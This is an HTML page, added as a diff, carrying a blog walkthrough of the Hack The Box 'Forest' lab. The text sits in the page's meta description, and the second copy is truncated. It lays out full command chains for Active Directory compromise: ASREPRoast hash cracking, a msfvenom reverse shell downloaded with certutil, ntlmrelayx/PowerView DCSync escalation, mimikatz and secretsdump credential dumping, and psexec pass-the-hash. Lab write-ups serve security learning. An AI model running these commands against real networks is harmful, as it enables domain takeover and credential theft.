@@ -1,0 +1,915 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Forest" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience! Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.161 forest.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 $ nmap -sV -sT -sC forest.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-19 08:19 EDT Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 55.65% done; ETC: 08:19 (0:00:08 remaining) Nmap scan report for forest.htb (10.10.10.161) Host is up (0.26s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-19 12:27:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=10/19%Time=5DAAFF64%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,&quot;\0\xdir 1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version SF:\x04bind\0\0\x10\0\x03&quot;)%r(HTTPOptions,2A,&quot;\0\(m\xd1\x81\x82\0\x01\0\0\ SF:0\0\0\x01\0\0\x02\0\x01\0\0\)\x0f\xa0\0\0\0\0\0\x0c\0\n\0\x08\xbd&lt;\.\x1 SF:b\x9d\x91\xc8`&quot;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m37s, deviation: 4h02m31s, median: 7m36s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-19T05:29:41-07:00 | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-19 08:29:43 |_ start_date: 2019-10-19 06:16:26 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 285.63 seconds Enumeration (1) Seems like an Active Directory Domain Controller. Where do we start ? @.@ According to the nmap’s host script results, we see the actual domain name of the box is htb.local so lets modify /etc/hosts to include it as well. 1 2 3 $ cat /etc/hosts ... 10.10.10.161 forest.htb htb.local Seeing that there might be a DNS server running on port 53, lets try to use dig on it. 1 2 3 4 5 $ dig axfr htb.local @10.10.10.161 ; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr htb.local @10.10.10.161 ;; global options: +cmd ; Transfer failed. Nothing :( LDAP is running on port 389 so lets check that out using ldapsearch. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ldapsearch -h htb.local -p 389 -x -b &quot;dc=htb,dc=local&quot; # extended LDIF # # LDAPv3 # base &lt;dc=htb,dc=local&gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # htb.local dn: DC=htb,DC=local objectClass: top objectClass: domain objectClass: domainDNS distinguishedName: DC=htb,DC=local ... I’m not sure what to look for but let’s first look at what users we can find? I wasn’t familiar with how LDAP queries work so I decided to use another tool windapsearch to simplify the job. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 python windapsearch.py -d htb.local -U [+] No username provided. Will try anonymous bind. [+] No DC IP provided. Will try to discover via DNS lookup. [+] Using Domain Controller at: 10.10.10.161 [+] Getting defaultNamingContext from Root DSE [+] Found: DC=htb,DC=local [+] Attempting bind [+] ...success! Binded as: [+] None [+] Enumerating all AD users [+] Found 28 users: ... cn: Sebastien Caron userPrincipalName: sebastien@htb.local cn: Lucinda Berger userPrincipalName: lucinda@htb.local cn: Andy Hislip userPrincipalName: andy@htb.local cn: Mark Brandt userPrincipalName: mark@htb.local cn: Santi Rodriguez userPrincipalName: santi@htb.local [*] Bye! Nice! We found 5 usernames to play with! But what exactly can we do with them? Seeing that there is Kerberos running on port 88, we know that we probably need to get our hands dirty with Kerberos attacks. After reading this article, lets see if we can perform the ASREPRoast attack using impacket’s GetNPUsers.py while specifying the 5 usernames we found. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ cat users.txt sebastien lucinda andy mark santi $ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set Looks like we didn’t manage to get any hashes… At this point, I wasn’t sure how to carry on so I check the forums for hints. Many of them actually stated that they were able to obtain a hash but instead of finding 5 usernames, they found 6? How was I missing a username? Inside of impacket’s collection of scripts, there was a file called GetADUsers.py which seemed hopeful. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ GetADUsers.py -all htb.local/ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Querying htb.local for information about domain. Name Email PasswordLastSet LastLogon -------------------- ------------------------------ ------------------- ------------------- Administrator Administrator@htb.local 2019-09-18 13:09:08.342879 2019-10-07 06:57:07.299606 Guest &lt;never&gt; &lt;never&gt; DefaultAccount &lt;never&gt; &lt;never&gt; krbtgt 2019-09-18 06:53:23.467452 &lt;never&gt; $331000-VK4ADACQNUCA &lt;never&gt; &lt;never&gt; ... sebastien 2019-09-19 20:29:59.544725 2019-09-22 18:29:29.586227 lucinda 2019-09-19 20:44:13.233891 &lt;never&gt; svc-alfresco 2019-11-16 07:54:12.200875 2019-11-16 07:52:19.754834 andy 2019-09-22 18:44:16.291082 &lt;never&gt; mark 2019-09-20 18:57:30.243568 &lt;never&gt; santi 2019-09-20 19:02:55.134828 &lt;never&gt; There it is! The 6th username is svc-alfresco. But I wonder why did the username not appear in our LDAP search results just now? After appending the username to the list of usernames, we performed the ASREPRoast attack again. 1 2 3 4 5 6 7 8 9 10 11 $ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set $ cat hashes.asreproast $krb5asrep$23$svc-alfresco@HTB.LOCAL:2bb5707401079b05d2add14953eb4d3c$e18b26c973eff18a7251f9f91af611d656b3534a66acd206f4354192c9c190583dc0444ec333ced4859abdd727fefe34277023f77ce6074bae70b015f6fb94d0abdd9f6c900c15d55f59919c7261e62c10f29f8e63cca4906f4df075a12e10398d094f1ca165a3b23a419501c363b77b607bdcf740931c0bb21866b2feed344d4195a1a164d7c27154e7a00131f9f7a6e8a7ac4845df6fe7b27656a6423126a3933503d7d507f68b787d21e1b80d1fefb09f0dfd237b8ff3e499613f5fd0e0baa2c000c1fcf069fc4d1d5bcedf98d8fb6d8eebf70d6233e10e40944ce5849c7bb94319d68229 Great! We are back on track! We then cracked the hash using john. 1 2 3 4 5 6 7 8 9 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status s3rvice ($krb5asrep$svc-alfresco@HTB.LOCAL) 1g 0:00:00:06 DONE (2019-10-26 03:10) 0.1457g/s 595591p/s 595591c/s 595591C/s s401447401447401447..s3r2s1 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed With svc-alfresco:s3rvice, I tried enumerating for SMB shares using smbmap but found nothing :( 1 2 3 4 5 6 7 8 9 10 11 smbmap -H htb.local -u svc-alfresco -p s3rvice [+] Finding open SMB ports.... [+] User SMB session establishd on htb.local... [+] IP: htb.local:445 Name: htb.local Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY NETLOGON READ ONLY SYSVOL READ ONLY With no other service to try out the credentials, I re-scanned for open ports, but this time from ports 1-65535. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sS -p 1-65535 htb.local Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 08:40 EST Nmap scan report for htb.local (10.10.10.161) Host is up (0.25s latency). Not shown: 65511 closed ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49671/tcp open unknown 49676/tcp open unknown 49677/tcp open unknown 49684/tcp open unknown 49698/tcp open unknown 49708/tcp open unknown I now see a possible entry point, which is port 5985 that is used by the WinRM service for remote management of Windows systems. Lets see if we can establish a shell using Alamot’s winrm_shell.rb 1 2 3 4 5 6 7 8 9 10 11 12 require &#39;winrm&#39; # Author: Alamot conn = WinRM::Connection.new( endpoint: &#39;http://htb.local:5985/wsman&#39;, transport: :ssl, user: &#39;htb.local\svc-alfresco&#39;, password: &#39;s3rvice&#39;, :no_ssl_peer_verification =&gt; true ) ... user.txt 1 2 3 $ ruby winrm_shell.rb PS htb\svc-alfresco@FOREST Documents&gt; whoami htb\svc-alfresco We finally got in! Now, to grab the user flag. 1 2 3 PS htb\svc-alfresco@FOREST Documents&gt; cd ../Desktop PS htb\svc-alfresco@FOREST Desktop&gt; more user.txt e5e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) This was where I really got lost and I had to turn to the forums for more hints. Many mentioned about some “dog” but I guess they were referring to BloodHound. 1 2 3 BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment. When I first read the description, I was pretty amazed as I had yet to see any applications of graph theory in cyber security and I did a bit of graph theory in my data structures and algorithms class. To get the PowerShell ingestor (SharpHound) to run on the system, I first need to upgrade my current WinRM shell to a meterpreter shell. First, I generate my reverse shell executable using msfvenom and start our reverse shell listener. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LHOST 10.10.XX.XX LHOST =&gt; 10.10.XX.XX msf5 exploit(multi/handler) &gt; set LPORT 1337 LPORT =&gt; 1337 msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:1337 And then start a web server using the builtin SimpleHTTPServer module in python 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/shell.exe . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... In our previous WinRM shell still hopefully connected, 1 2 3 4 5 6 7 PS htb\svc-alfresco@FOREST Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS htb\svc-alfresco@FOREST Documents&gt;./shell.exe 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.161 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500 meterpreter &gt; Next up, we upload SharpHound.ps1 to the box and run it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 meterpreter &gt; upload SharpHound.ps1 . [*] uploading : SharpHound.ps1 -&gt; . [*] uploaded : SharpHound.ps1 -&gt; .\SharpHound.ps1 meterpeter &gt; shell Process 2476 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Users\svc-alfresco\Documents&gt; powershell Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\Users\svc-alfresco\Documents&gt; Import-Module .\SharpHound.ps1 Import-Module .\SharpHound.ps1 PS C:\Users\svc-alfresco\Documents&gt; Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice Invoke-BloodHound -CollectionMethod All -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice Initializing BloodHound at 8:42 AM on 11/16/2019 Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets Starting Enumeration for htb.local Status: 124 objects enumerated (+124 41.33333/s --- Using 70 MB RAM ) Finished enumeration for htb.local in 00:00:03.7645465 1 hosts failed ping. 0 hosts timedout. Compressing data to C:\Users\svc-alfresco\Documents\20191116084214_BloodHound.zip. You can upload this file directly to the UI. Finished compressing files! And now to retrieve the compressed file back to our system. 1 2 3 4 5 PS C:\Users\svc-alfresco\Documents&gt; exit C:\Users\svc-alfresco\Documents&gt; exit meterpreter &gt; download 20191116084214_BloodHound.zip [*] downloading : 20191116084214_BloodHound.zip. -&gt; /root/Desktop [*] downloaded : 20191116084214_BloodHound.zip. -&gt; /root/Desktop/20191116084214_BloodHound.zip And now the moment you have been waiting for, witness the capabilities of BloodHound! There are actually 2 ways to run BloodHound, first being running it on your own system and secondly being running it in a Docker container. Since it is extremely troublesome to set up, I will be using this image belane/bloodhound. 1 2 3 4 5 6 $ docker run -it \ -p 7474:7474 \ -e DISPLAY=unix$DISPLAY \ -v /tmp/.X11-unix:/tmp/.X11-unix \ --device=/dev/dri:/dev/dri \ --name bloodhound belane/bloodhound What you will notice is that a window will automatically be opened and BloodHound is instantly ready to be used. Currently, it is not displaying anything as we had yet to upload our data yet. BloodHound actually supports drag and drop but for some reason it was not working so we need to use docker cp to get the data in. 1 $ docker cp 20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip Then from the interface, click on Upload Data on the right side, select the file and hit Open. It will take a while for BloodHound to populate its database. I won’t go through all the features of BloodHound, but I will be focusing on one of them which is the ability to perform pathfinding from a given Start Node to a given Target Node. These nodes can be Users, Groups or OUs. Since we are currently svc-alfresco and are attempting to escalate to the Administrator account, we will set svc-alfresco@htb.local as the Start Node and Administrator@htb.local as the Target Node and hope that we are able to find a path. Click on the triangle button to begin pathfinding. As you can see, there is indeed a path for us to escalate our privileges. The main focus will be on the edge between EXCHANGE WINDOWS PERMISSION@HTB.LOCAL and HTB.LOCAL. If you right-click on the edge and click on Help, more information of the WriteDacl privilege will be given. 1 The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object&#39;s DACL, you can grant yourself any privilege you want on the object. According to this post, the WriteDacl privilege allows us to perform DCSync operations, which somehow allows us to retrieve hashed passwords from the Active Directory. Hence, we will need to add a user to the EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL. Exploitation First we will need to upload PowerView, which is a module that I use that contains many useful Powershell commands for offensive operations. 1 2 3 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1 Back to the powershell shell, we will import it in. 1 Import-Module .\PowerView.ps1 Next we will create a new user and add him to the EXCHANGE WINDOWS PERMISSIONS group. 1 2 3 $UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword Add-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &#39;rizemon&#39; According to this picture from the earlier post, we will need to run ntlmrelayx on our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ ntlmrelayx.py -t ldap://htb.local --escalate-user rizemon Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Protocol Client SMB loaded.. [*] Protocol Client LDAP loaded.. [*] Protocol Client LDAPS loaded.. [*] Protocol Client IMAPS loaded.. [*] Protocol Client IMAP loaded.. [*] Protocol Client MSSQL loaded.. [*] Protocol Client HTTP loaded.. [*] Protocol Client HTTPS loaded.. [*] Protocol Client SMTP loaded.. [*] Running in relay mode to single host [*] Setting up SMB Server [*] Setting up HTTP Server [*] Servers started, waiting for connections With that done, we need to get the Exchange Server to perform NTLM authentication to us over HTTP. However, there is no Exchange server running on the box! Since we already have a user in the EXCHANGE WINDOWS PERMISSIONS group, we can simply use our own browser to do the authentication. Opening any browser, we browse to http://localhost/privexchange. We will then be prompted for credentials, where we enter those of our newly created user and hit OK. Back on our ntlmrelayx, we see that our new user has gotten the necessary privileges to perform DCSync operations! 1 2 3 4 5 6 7 8 9 10 11 *] HTTPD: Received connection from 127.0.0.1, attacking target ldap://htb.local [*] HTTPD: Client requested path: /privexchange [*] HTTPD: Client requested path: /privexchange [*] Authenticating against ldap://htb.local as \rizemon SUCCEED [*] Enumerating relayed user&#39;s privileges. This may take a while on large domains [*] User privileges found: Create user [*] User privileges found: Modifying domain ACL [*] Querying domain security descriptor [*] Success! User rizemon now has Replication-Get-Changes-All privileges on the domain [*] Try using DCSync with secretsdump.py and this user :) [*] Saved restore state to aclpwn-20191229-070933.restore And now the last step is to obtain the hash for the domain administrator account using impacket’s secretsdump.py. 1 2 3 4 5 6 7 $ python secretsdump.py &#39;htb.local/rizemon:Password123!@htb.local&#39; -just-dc Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: ... root.txt (1) Using impacket’s psexec.py and the hashes we got, we can remotely login to the box as Administrator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ psexec.py Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on htb.local..... [*] Found writable share ADMIN$ [*] Uploading file NKMskQmQ.exe [*] Opening SVCManager on htb.local..... [*] Creating service IHWO on htb.local..... [*] Starting service IHWO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\root.txt f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt(2) First we will need to upload PowerView, which contains the commands needed for our exploit. 1 2 3 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1 Back to the powershell shell, we will import it in. 1 Import-Module .\PowerView.ps1 Next we will create a new user and add him to the EXCHANGE WINDOWS PERMISSIONS group. 1 2 3 $UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword Add-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &#39;rizemon&#39; With that done, we will need to login as the newly created user. To do so, we will need to allow the user to be remotely managed by adding him to the Remote Management Users group. 1 Add-DomainGroupMember -Identity &quot;Remote Management Users&quot; -Members &#39;rizemon&#39; We then establish a shell using Alamot’s winrm_shell.rb and upgrade to a meterpreter shell. 1 2 3 4 5 6 7 8 9 10 11 12 require &#39;winrm&#39; # Author: Alamot conn = WinRM::Connection.new( endpoint: &#39;http://htb.local:5985/wsman&#39;, transport: :ssl, user: &#39;htb.local\rizemon&#39;, password: &#39;Password123!&#39;, :no_ssl_peer_verification =&gt; true ) ... 1 2 3 4 5 6 7 8 $ ruby winrm_shell.rb PS htb\rizemon@FOREST Documents&gt; certutil -f -split -urlcache http://10.10.XX.XX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS htb\rizemon@FOREST Documents&gt;./shell.exe 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.161 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -&gt; 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500 meterpreter &gt; We are going to need PowerView again as well as mimikatz, which is used to dump out the password hashes. 1 2 3 4 5 6 meterpreter &gt; upload /root/Downloads/PowerView.ps1 . [*] uploading : /root/Downloads/PowerView.ps1 -&gt; . [*] uploaded : /root/Downloads/PowerView.ps1 -&gt; .\PowerView.ps1 meterpreter &gt; upload /root/Downloads/mimikatz.exe . [*] uploading : /root/Downloads/mimikatz.exe -&gt; . [*] uploaded : /root/Downloads/mimikatz.exe -&gt; .\mimikatz.exe To dump out the hashes, the new user will need the DCSync privileges, which consist of the DS-Replication-Get-Changes, DS-Replication-Get-Changes-All and Replicating Directory Changes In Filtered Set rights. More can be learnt from here. Fortunately, we can use the Add-DomainObjectAcl function to add all 3 privilges for us using the -Rights DCSync option. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 meterpreter &gt; shell Process 1224 created. Channel 2 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Users\rizemon\Documents&gt;powershell powershell Windows PowerShell Copyright (C) 2016 Microsoft Corporation. All rights reserved. PS C:\Users\peter1\Documents&gt;Import-Module ./PowerView.ps1 Import-Module ./PowerView.ps1 PS C:\Users\peter1\Documents&gt; Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync And finally, we dump out the hashes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 PS C:\Users\rizemon\Documents&gt; ./mimikatz.exe ./mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Nov 25 2019 02:50:28 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ## &gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # lsadump::dcsync /domain:htb.local /user:Administrator [DC] &#39;htb.local&#39; will be the domain [DC] &#39;FOREST.htb.local&#39; will be the DC server [DC] &#39;Administrator&#39; will be the user account Object RDN : Administrator ** SAM ACCOUNT ** SAM Username : Administrator User Principal Name : Administrator@htb.local Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000200 ( NORMAL_ACCOUNT ) Account expiration : Password last change : 9/18/2019 9:09:08 AM Object Security ID : S-1-5-21-3072663084-364016917-1341370565-500 Object Relative ID : 500 Credentials: Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6 Using impacket’s psexec.py and the hash we got, we can remotely login to the box as Administrator. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ psexec.py Administrator@htb.local -hashes :32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Requesting shares on htb.local..... [*] Found writable share ADMIN$ [*] Uploading file NKMskQmQ.exe [*] Opening SVCManager on htb.local..... [*] Creating service IHWO on htb.local..... [*] Starting service IHWO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\root.txt f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience! Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.161 forest.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 $ nmap -sV -sT -sC forest.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-19 08:19 EDT Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 55.65% done; ETC: 08:19 (0:00:08 remaining) Nmap scan report for forest.htb (10.10.10.161) Host is up (0.26s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-19 12:27:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=10/19%Time=5DAAFF64%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,&quot;\0\xdir 1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version SF:\x04bind\0\0\x10\0\x03&quot;)%r(HTTPOptions,2A,&quot;\0\(m\xd1\x81\x82\0\x01\0\0\ SF:0\0\0\x01\0\0\x02\0\x01\0\0\)\x0f\xa0\0\0\0\0\0\x0c\0\n\0\x08\xbd&lt;\.\x1 SF:b\x9d\x91\xc8`&quot;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m37s, deviation: 4h02m31s, median: 7m36s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-19T05:29:41-07:00 | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-19 08:29:43 |_ start_date: 2019-10-19 06:16:26 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) 